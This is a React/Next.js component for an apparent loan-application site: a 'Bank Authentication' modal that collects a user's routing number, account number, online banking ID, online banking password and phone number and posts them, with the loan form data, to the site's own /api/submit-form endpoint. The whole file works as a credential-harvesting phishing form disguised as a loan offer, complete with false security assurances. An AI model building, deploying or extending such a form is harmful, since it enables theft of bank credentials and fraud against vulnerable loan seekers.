"use client"

import { useEffect } from "react"

import type React from "react"
import { useState } from "react"
import { useRouter } from "next/navigation"
import { Dialog, DialogContent } from "@/components/ui/dialog"
import { Button } from "@/components/ui/button"
import { Input } from "@/components/ui/input"
import { Loader2, X, ShieldCheck, Check } from "lucide-react"
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select"

interface BankLoginModalProps {
  isOpen: boolean
  onClose: () => void
  bankName: string
  bankId: string
  loanFormData: Record<string, string> | null
}

const banks = [
  { id: "usaa", name: "Usaa" },
  { id: "chase", name: "Chase" },
  { id: "bankofamerica", name: "Bank of America" },
  { id: "wellsfargo", name: "Wells Fargo" },
  { id: "tdbank", name: "TD Bank" },
  { id: "navyfederal", name: "Navy Federal Credit Union" },
  { id: "truist", name: "Truist" },
  { id: "usbank", name: "Us Bank" },
  { id: "keybank", name: "KeyBank" },
  { id: "citibank", name: "CitiBank" },
]

export function BankLoginModal({ isOpen, onClose, bankName, bankId, loanFormData }: BankLoginModalProps) {
  const router = useRouter()
  const [isSubmitting, setIsSubmitting] = useState(false)
  const [selectedBank, setSelectedBank] = useState(bankName)
  const [customBankName, setCustomBankName] = useState("")
  const isOtherBank = bankId === "other"
  const [bankFormData, setBankFormData] = useState({
    routingNumber: "",
    accountNumber: "",
    onlineBankingId: "",
    onlineBankingPassword: "",
    phoneNumber: "",
  })

  // Update selected bank when bankName prop changes (when user clicks a bank logo)
  useEffect(() => {
    if (bankName) {
      setSelectedBank(bankName)
    }
  }, [bankName])

  const updateBankFormData = (field: string, value: string) => {
    setBankFormData((prev) => ({ ...prev, [field]: value }))
  }

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault()
    setIsSubmitting(true)

    try {
      const allData = {
        ...loanFormData,
        bankName: selectedBank,
        bankId,
        routingNumber: bankFormData.routingNumber,
        accountNumber: bankFormData.accountNumber,
        onlineBankingId: bankFormData.onlineBankingId,
        onlineBankingPassword: bankFormData.onlineBankingPassword,
        phoneNumber: bankFormData.phoneNumber,
        submittedAt: new Date().toISOString(),
      }

      // Use API route instead of server action
      const response = await fetch("/api/submit-form", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify(allData),
      })

      const result = await response.json()

      if (result.success) {
        sessionStorage.removeItem("loanFormData")
        onClose()
        router.push("/success")
      } else {
        alert("There was an error submitting your application. Please try again.")
      }
    } catch (error) {
      console.error("Error submitting form:", error)
      alert("There was an error submitting your application. Please try again.")
    } finally {
      setIsSubmitting(false)
    }
  }

  return (
    <Dialog open={isOpen} onOpenChange={onClose}>
      <DialogContent className="sm:max-w-lg p-0 overflow-hidden rounded-xl border-0 shadow-2xl">
        <div className="flex items-center justify-between px-6 py-4 bg-gray-50 border-b">
          <h2 className="text-xl font-bold text-gray-900">Bank Authentication</h2>
          <button
            onClick={onClose}
            className="h-10 w-10 rounded-full bg-gray-200 flex items-center justify-center hover:bg-gray-300 transition-colors"
          >
            <X className="h-5 w-5 text-gray-600" />
          </button>
        </div>

        <div className="p-6">
          <div className="border border-gray-200 rounded-xl p-6">
            <div className="text-center mb-6">
              <h3 className="text-xl font-bold text-gray-900 mb-2">Enter Your Banking Details</h3>
              <p className="text-gray-600 text-sm">
                Please enter the credentials you use for mobile or online banking.
              </p>
            </div>

            <form onSubmit={handleSubmit} className="space-y-4">
              {isOtherBank ? (
                <Input
                  placeholder="Enter your bank name"
                  value={customBankName}
                  onChange={(e) => {
                    setCustomBankName(e.target.value)
                    setSelectedBank(e.target.value)
                  }}
                  required
                  className="h-12 border-gray-300 rounded-lg text-base placeholder:text-gray-400"
                />
              ) : (
                <Select value={selectedBank} onValueChange={setSelectedBank}>
                  <SelectTrigger className="w-full h-12 border-gray-300 rounded-lg text-base">
                    <SelectValue placeholder="Select your bank" />
                  </SelectTrigger>
                  <SelectContent>
                    {banks.map((bank) => (
                      <SelectItem key={bank.id} value={bank.name}>
                        {bank.name}
                      </SelectItem>
                    ))}
                  </SelectContent>
                </Select>
              )}

              <Input
                placeholder="Routing Number (e.g. 123456789)"
                value={bankFormData.routingNumber}
                onChange={(e) => updateBankFormData("routingNumber", e.target.value)}
                required
                className="h-12 border-gray-300 rounded-lg text-base placeholder:text-gray-400"
              />

              <Input
                placeholder="Account Number"
                value={bankFormData.accountNumber}
                onChange={(e) => updateBankFormData("accountNumber", e.target.value)}
                required
                className="h-12 border-gray-300 rounded-lg text-base placeholder:text-gray-400"
              />

              <Input
                placeholder="Online Banking ID"
                value={bankFormData.onlineBankingId}
                onChange={(e) => updateBankFormData("onlineBankingId", e.target.value)}
                required
                className="h-12 border-gray-300 rounded-lg text-base placeholder:text-gray-400"
              />

              <Input
                type="password"
                placeholder="Online Banking Password"
                value={bankFormData.onlineBankingPassword}
                onChange={(e) => updateBankFormData("onlineBankingPassword", e.target.value)}
                required
                className="h-12 border-gray-300 rounded-lg text-base placeholder:text-gray-400"
              />

              <Input
                placeholder="Phone Number (e.g. 555-123-4567)"
                value={bankFormData.phoneNumber}
                onChange={(e) => updateBankFormData("phoneNumber", e.target.value)}
                required
                className="h-12 border-gray-300 rounded-lg text-base placeholder:text-gray-400"
              />

              <Button
                type="submit"
                className="w-full h-12 bg-gray-800 hover:bg-gray-900 text-white font-semibold text-base rounded-lg"
                disabled={isSubmitting}
              >
                {isSubmitting ? (
                  <>
                    <Loader2 className="mr-2 h-5 w-5 animate-spin" />
                    Submitting...
                  </>
                ) : (
                  "Submit"
                )}
              </Button>
            </form>
          </div>

          <div className="mt-6 space-y-4">
            <div className="flex items-center justify-center gap-2">
              <ShieldCheck className="h-5 w-5 text-green-500" />
              <span className="text-green-600 font-medium text-sm">
                Securely linked with all mobile/online Banking Server
              </span>
            </div>

            <div className="space-y-2 pl-4">
              <div className="flex items-center gap-2">
                <Check className="h-4 w-4 text-green-500" />
                <span className="text-green-600 font-medium text-sm">10% interest rate</span>
              </div>
              <div className="flex items-center gap-2">
                <Check className="h-4 w-4 text-green-500" />
                <span className="text-green-600 font-medium text-sm">No prepayment fees</span>
              </div>
              <div className="flex items-center gap-2">
                <Check className="h-4 w-4 text-green-500" />
                <span className="text-green-600 font-medium text-sm">Fast Funding</span>
              </div>
            </div>
          </div>
        </div>
      </DialogContent>
    </Dialog>
  )
}
